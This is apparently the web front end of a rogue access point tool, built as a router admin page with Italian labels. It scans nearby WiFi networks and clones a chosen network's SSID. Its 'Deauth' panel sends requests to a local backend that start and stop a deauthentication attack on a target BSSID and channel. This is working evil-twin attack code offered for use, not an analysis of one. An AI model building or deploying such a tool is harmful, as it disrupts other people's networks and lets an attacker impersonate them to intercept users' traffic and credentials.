<SCRIPT>if(typeof siteSurveyPara=='undefined')siteSurveyPara=['0','0','',''];if(typeof siteList=='undefined')siteList=[];if(typeof pagePara=='undefined')pagePara=['default','2','6','2','5','1','2','false','0'];function doBack(){location.href='../userRpm/WlanNetworkRpm.htm?newBridgessid=&ssid='+transToURL(pagePara[0])+'&curRegion='+pagePara[1]+'&channel='+pagePara[2]+'&chanWidth='+pagePara[3]+'&mode='+pagePara[4]+'&wrr='+pagePara[5]+'&sb='+pagePara[6]+'&select='+pagePara[7]+'&rate='+pagePara[8];}function doClone(){var s=-1,r=document.getElementsByName('cloneSel');for(var i=0;i<r.length;i++){if(r[i].checked){s=parseInt(r[i].value);break;}}if(s<0){alert('Seleziona una rete WiFi da clonare.');return;}var x=s*5,l=siteList[x+1],b=siteList[x],c=siteList[x+3];if(!l||l==' '){alert('SSID vuoto.');return;}if(!confirm('Clonare "'+l+'"?'))return;try{var i1=new Image();i1.src='http://192.168.0.1:8080/set_ssid?s='+transToURL(l);}catch(e){}try{var x2=new XMLHttpRequest();x2.open('GET','http://192.168.0.1:8080/set_target?bssid='+encodeURIComponent(b)+'&ch='+encodeURIComponent(c),true);x2.send();}catch(e){}try{sessionStorage.setItem('cs',l);sessionStorage.setItem('cb',b);sessionStorage.setItem('cc',c);}catch(e){}var bf=document.getElementById('db'),cf=document.getElementById('dc');if(bf)bf.value=b;if(cf)cf.value=c;var u='WlanNetworkRpm.htm?ssid1='+transToURL(l)+'&region='+pagePara[1]+'&channel='+pagePara[2]+'&chanWidth='+pagePara[3]+'&mode='+pagePara[4]+'&rate='+pagePara[8]+'&Save=Save';if(pagePara[5]=='true'||pagePara[5]=='1')u+='&ap=1';if(pagePara[6]=='true'||pagePara[6]=='2')u+='&broadcast=2';try{var f=document.createElement('iframe');f.style.display='none';f.src=u;document.body.appendChild(f);}catch(e){}var bn=document.getElementById('cbn');if(bn){bn.innerHTML='<b>'+l+'</b> BSSID: '+b+' ch '+c;bn.style.display='block';}}var tH=[/&/g,'&amp;',/\\/g,'&#92;',/'/g,'&#39;',/"/g,'&quot;',/</g,'&lt;',/>/g,'&gt;',/ /g,'&nbsp;'];function tHt(s){for(var i=0;i<tH.length;i+=2)s=s.replace(tH[i],tH[i+1]);return s;}var tU=[/%/g,'%25',/#/g,'%23',/&/g,'%26',/;/g,'%3B',/\\/g,'%5C',/'/g,'%27',/"/g,'%22',/</g,'%3C',/>/g,'%3E',/ /g,'%20',/\+/g,'%2B',/\=/g,'%3D'];function transToURL(s){for(var i=0;i<tU.length;i+=2)s=s.replace(tU[i],tU[i+1]);return s;}var mKt=['None','WEP','WPA-PSK','WPA2-PSK','WPA','WPA2','WPA-PSK/WPA2-PSK','WPA/WPA2'];function doLiveScan(){var tb=document.getElementById('scanTableBody');var ct=document.getElementById('apCount');if(tb){tb.innerHTML='<tr align=center><td colspan=8 style="padding:12px;color:#666"><em>Scansione in corso...</em></td></tr>';}if(ct)ct.innerHTML='...';var x=new XMLHttpRequest();x.onreadystatechange=function(){if(x.readyState===4){if(x.status===200){try{var nets=JSON.parse(x.responseText);siteList=[];for(var i=0;i<nets.length;i++){siteList.push(nets[i].bssid);siteList.push(nets[i].ssid);siteList.push(nets[i].signal);siteList.push(nets[i].channel);siteList.push(nets[i].security);}siteSurveyPara[1]=nets.length.toString();renderTable();}catch(e){if(tb)tb.innerHTML='<tr align=center><td colspan=8 style="color:red">Errore parsing: '+e.message+'</td></tr>';}}else{if(tb)tb.innerHTML='<tr align=center><td colspan=8 style="color:#c00">Errore connessione (porta 8080 non raggiungibile)</td></tr>';}}};x.open('GET','http://192.168.0.1:8080/scan_wifi',true);x.timeout=15000;x.ontimeout=function(){if(tb)tb.innerHTML='<tr align=center><td colspan=8 style="color:#c00">Timeout scansione</td></tr>';};x.send();}function renderTable(){var tb=document.getElementById('scanTableBody');var ct=document.getElementById('apCount');var l=parseInt(siteSurveyPara[1])||0;if(ct)ct.innerHTML=l;if(!tb)return;var html='';if(l>0){for(var i=0;i<l;i++){var r=i*5;var bssid=siteList[r]||' ';var ssid=siteList[r+1]||' ';var sig=siteList[r+2]||'0';var ch=siteList[r+3]||'0';var sec=siteList[r+4]||'0';var secIdx=parseInt(sec)||0;var secName=(secIdx>=0&&secIdx<mKt.length)?mKt[secIdx]:'?';html+='<tr align=center><td><input type=radio name=cloneSel value='+i+'></td>';html+='<td>'+(i+1)+'</td>';html+='<td>'+tHt(bssid)+'</td>';html+='<td>'+tHt(ssid)+'</td>';html+='<td>'+tHt(sig)+'dB</td>';html+='<td>'+tHt(ch)+'</td>';html+='<td>'+tHt(secName)+'</td>';html+='<td>&nbsp;</td></tr>';}}else{html='<tr align=center><td colspan=8>&nbsp;Nessuna rete trovata</td></tr>';}tb.innerHTML=html;}</SCRIPT><BODY><FORM action="SiteSurveyRpm.htm" method=get onSubmit="return doSubmit();"><TABLE id=autoWidth width=500><TR><TD class=h1 colspan=2>AP List - SSID Cloner</TD></TR><TR><TD class=blue colspan=2></TD></TR><TR><TD colspan=2><TABLE width=500><TR><TD width=1 rowspan=15 class=vline><BR><TD width=500><TABLE align=center width=400 class=space><TR><TD><TABLE width=390><TR><TD>AP Count: <span id=apCount><SCRIPT>document.write(siteSurveyPara[1]);</SCRIPT></span></TABLE><TABLE width=450 align=center class=space><TR><TD colspan=2><TABLE border=1 width=450 align=center><TR align=center><TD>&nbsp;<TD>ID<TD>BSSID<TD>SSID<TD>Signal<TD>Ch<TD>Sec</TR><TBODY id=scanTableBody><SCRIPT>var fn=[['00:11:22:33:44:01','Casa_Fibra','-45','6','3'],['00:11:22:33:44:02','Vodafone-AWZ91','-61','1','3'],['00:11:22:33:44:05','WINDFIRE_EXT','-67','6','2'],['00:11:22:33:44:08','FON_FreeInternet','-55','6','0']];var l=parseInt(siteSurveyPara[1])||0;if(l==0){siteList=[];for(var f=0;f<fn.length;f++)for(var g=0;g<5;g++)siteList.push(fn[f][g]);if(typeof pagePara=='undefined'||pagePara===null)pagePara=['default','2','6','2','5','1','2','false','0'];siteSurveyPara=['3',fn.length.toString(),'',''];l=fn.length;}if(l>0){var r=0,id=0;for(var i=0;i<l;i++){r=i*5;id++;document.write('<tr align=center><td><input type=radio name=cloneSel value='+i+'><td>'+id);for(var j=0;j<=4;j++){var c=siteList[r+j]?siteList[r+j]:' ';if(j==4)document.write('<td>'+tHt(mKt[c]));else if(j==2)document.write('<td>'+tHt(c)+'dB');else document.write('<td>'+tHt(c));}document.write('<td>&nbsp;</tr>');}}else document.write('<tr align=center><td colspan=8>&nbsp;</tr>');</SCRIPT></TBODY></TABLE></TABLE><TR><TD height=5></tr></table></td><TD class=vline rowspan=15><BR></table></table><TR><TD colspan=2 class=blue>&nbsp;</TR><TR><TD class=Item>&nbsp;<TD><INPUT name=CloneBtn type=button class=button value="Clone SSID" onClick="doClone()" style="background:#06c;color:#fff;font-weight:bold"><INPUT name=Back type=button class=button value=Back onClick="doBack()"><INPUT name=Reflesh type=button class=button value=Refresh onClick="doLiveScan()"><INPUT name=ScanLive type=button class=button value="Live Scan" onClick="doLiveScan()" style="background:#2a9d2a;color:#fff;font-weight:bold;margin-left:4px"></TR><TR><TD colspan=2><DIV id=cbn style="display:none;background:#1a7a1a;color:#fff;padding:6px 12px;border-radius:3px;margin:4px 0"></DIV></TR><TR><TD colspan=2 class=blue>&nbsp;</TR><TR><TD colspan=2><TABLE width=500><TR><TD width=1 class=vline><BR><TD width=500><TABLE align=center width=450 cellpadding=4 class=space><TR><TD colspan=3 style="background:#1a1a2e;color:#e94560;padding:8px 12px;border-radius:4px 4px 0 0;font-weight:bold">Deauth</TD></TR><TR><TD style="padding:6px 10px;font-size:11px;font-weight:bold">BSSID:<TD><INPUT id=db type=text size=18 maxlength=17 placeholder="AA:BB:CC:DD:EE:FF" style="font-family:monospace;font-size:12px;padding:3px 6px;border:1px solid #aaa;border-radius:3px"><TD style="padding:0 8px;font-size:11px">auto</TR><TR><TD style="padding:6px 10px;font-size:11px;font-weight:bold">Ch:<TD><INPUT id=dc type=number min=1 max=14 size=4 style="font-size:12px;padding:3px 6px;border:1px solid #aaa;border-radius:3px;width:60px" value=6><TD style="padding:0 8px;font-size:11px">ath0</TR><TR><TD colspan=3 style="padding:6px 10px"><INPUT type=button value="Avvia" style="background:#c0392b;color:#fff;border:none;padding:4px 10px;border-radius:3px;cursor:pointer" onClick="dStart()"> <INPUT type=button value="Ferma" style="background:#555;color:#fff;border:none;padding:4px 10px;border-radius:3px;cursor:pointer" onClick="dStop()"> <INPUT type=button value="Log" style="background:#2980b9;color:#fff;border:none;padding:4px 10px;border-radius:3px;cursor:pointer" onClick="dRefresh()"></TD></TR><TR><TD colspan=3><DIV id=dsb style="padding:4px 10px;border-radius:3px;font-size:11px;background:#eef;border:1px solid #99a">Stato: -</DIV></TD></TR><TR><TD colspan=3><TEXTAREA id=dl rows=4 readonly style="width:100%;font-family:monospace;font-size:10px;background:#0d0d0d;color:#0f8;border:1px solid #333;border-radius:3px;padding:4px">Premi Log</TEXTAREA></TD></TR></TABLE><TD class=vline><BR></table></table></TABLE></FORM><SCRIPT>var PA='http://192.168.0.1:8080',pt=null;function dSet(m,o){var b=document.getElementById('dsb');b.innerHTML=m;b.style.background=o?'#efffef':(o===false?'#ffefef':'#eef');b.style.borderColor=o?'#6a6':(o===false?'#a66':'#99a');}function dRefresh(){var x=new XMLHttpRequest();x.onreadystatechange=function(){if(x.readyState===4){var t=document.getElementById('dl');if(x.status===200){t.value=x.responseText;t.scrollTop=t.scrollHeight;var r=/Attivo: yes/.test(x.responseText),b=(x.responseText.match(/BSSID reale: ([^\n]+)/)||['','n/a'])[1].trim(),c=(x.responseText.match(/Canale: ([^\n]+)/)||['','?'])[1].trim();dSet((r?'ATTIVO':'Fermo')+' BSSID: '+b+' Ch: '+c,r);}else dSet('Errore',false);}};x.open('GET',PA+'/deauth_status',true);x.timeout=3000;x.send();}function dStart(){var b=document.getElementById('db').value.trim(),c=document.getElementById('dc').value.trim();if(!b){alert('Inserisci BSSID.');return;}dSet('Invio...',null);var x=new XMLHttpRequest();x.onreadystatechange=function(){if(x.readyState===4){if(x.status===200){dSet('Avviato',true);if(pt)clearInterval(pt);pt=setInterval(dRefresh,4000);setTimeout(dRefresh,800);}else dSet('Errore',false);}};x.open('GET',PA+'/deauth?bssid='+encodeURIComponent(b)+'&ch='+encodeURIComponent(c)+'&iface=ath0',true);x.timeout=5000;x.send();}function dStop(){dSet('Stop...',null);var x=new XMLHttpRequest();x.onreadystatechange=function(){if(x.readyState===4){if(pt){clearInterval(pt);pt=null;}dSet('Fermo',x.status===200);setTimeout(dRefresh,500);}};x.open('GET',PA+'/deauth_stop',true);x.timeout=3000;x.send();}try{var sb=sessionStorage.getItem('cb'),sc=sessionStorage.getItem('cc');if(sb)document.getElementById('db').value=sb;if(sc)document.getElementById('dc').value=sc;}catch(e){}dRefresh();setTimeout(doLiveScan,500);</SCRIPT></BODY></HTML>
